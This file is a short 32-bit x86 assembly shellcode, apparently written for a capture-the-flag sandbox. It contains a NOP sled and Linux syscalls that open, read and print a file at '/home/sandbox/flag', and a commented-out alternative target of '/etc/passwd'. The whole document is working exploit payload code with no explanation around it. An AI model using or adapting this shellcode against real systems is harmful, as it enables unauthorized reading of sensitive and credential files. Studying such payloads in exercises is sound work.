BITS 32

db "/home/sandbox/flag", 0x0
;db "/etc/passwd", 0x0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

mov al, 0x5
mov ebx, 0x90000
xor ecx, ecx
int 0x80

mov al, 0x3
cdq
xchg ebx, ecx
add cl, 0x64
mov bl, 0x1
mov dl, 0x64
int 0x80

mov al, 0x4
dec ebx
int 0x80


